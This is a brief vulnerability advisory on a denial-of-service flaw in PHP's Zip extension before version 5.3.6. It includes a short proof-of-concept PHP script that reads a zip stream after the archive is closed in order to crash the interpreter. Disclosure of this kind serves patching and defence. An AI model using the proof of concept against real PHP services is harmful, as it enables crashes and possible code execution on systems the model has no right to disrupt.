source: http://www.securityfocus.com/bid/46969/info

PHP is prone to a remote denial-of-service vulnerability that affects the 'Zip' extension.

Successful attacks will cause the application to crash, creating a denial-of-service condition. Due to the nature of this issue, arbitrary code-execution may be possible; however, this has not been confirmed.

Versions prior to PHP 5.3.6 are vulnerable. 

<?php

$target_file = 'META-INF/MANIFEST.MF';

$za = new ZipArchive();
if ($za->open('test.jar') !== TRUE)
{
    return FALSE;
}

if ($za->statName($target_file) !== FALSE)
{
    $fd = $za->getStream($target_file);
}
else
{
    $fd = FALSE;
}
$za->close();

if (is_resource($fd))
{
    echo strlen(stream_get_contents($fd));
}

?>